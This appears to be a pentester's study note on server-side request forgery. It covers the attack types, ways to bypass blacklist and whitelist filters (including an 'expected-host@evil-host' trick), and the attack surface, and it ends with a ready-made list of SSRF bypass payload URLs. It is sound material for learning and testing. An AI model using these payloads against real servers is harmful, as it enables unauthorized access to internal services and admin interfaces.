# Server Side Request Forgery (SSRF)

## What is it?
In SSRF, the attacker can abuse functionality on the server to read or update internal resources. 

When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs, the attacker may be able to read data from services that are not directly exposed on the internet

Note: XXE can lead to SSRF attacks.

## Types of SSRF

### SSRF against server
Attacker gets application to make an HTTP request back to server hosting the application using loopback address (localhost)
Eg: `http://127.0.0.1:80/admin`

### SSRF against other back-end systems
Accessing back-end systems that are not directly reachable by the user. The admin u=interfcae is at some IR address
Eg: `http://192.168.0.68/admin`

### Circumventing common SSRF defenses
1. SSRF with blacklist based input filters - blocking localhost, 127.0.0.1 etc.
    * Changing encoding and casing
    * Registering own domain which resolves to 127.0.0.1
    * Using alternative representations of localhost -> decimal octal etc.

2. SSRF with whitelist based input filters
    * Embed credentials in a URL before hostname, using `@`   
    ```
    https://expected-host@evil-host
    ```
    * Use `#` to indicate URL fragment
    * URL encode characters
    * Use combinations of the above techniques...


## Attack Surface
1. Anything where the server makes an API request to fetch content from the backend.
Eg: to display some information based on user input a POST call might be made

2. Uploading image
Eg: using user input to upload an image into the backend involves sending a POST request with the URL

3. Partial URLs in requests
4. Referrer Header in HTTP response


## Payloads:
```
## Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://0
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.①

## CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

## Decimal bypass
http://2130706433/ = http://127.0.0.1
http://017700000001 = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

## Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20

#Obfucating urls by double encoding
http://127.1/%2561dmin/ -> %61 is a in hex. %25 is % in hex. This still resolves to http://127.1/admin

##Domain FUZZ bypass (from https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Whitelist-bypass.txt)
http://{domain}@127.0.0.1
http://127.0.0.1#{domain}
http://{domain}.127.0.0.1
http://127.0.0.1/{domain}
http://127.0.0.1/?d={domain}
https://{domain}@127.0.0.1
https://127.0.0.1#{domain}
https://{domain}.127.0.0.1
https://127.0.0.1/{domain}
https://127.0.0.1/?d={domain}
http://{domain}@localhost
http://localhost#{domain}
http://{domain}.localhost
http://localhost/{domain}
http://localhost/?d={domain}
http://127.0.0.1%00{domain}
http://127.0.0.1?{domain}
http://127.0.0.1///{domain}
https://127.0.0.1%00{domain}
https://127.0.0.1?{domain}
https://127.0.0.1///{domain}
```

More:

https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
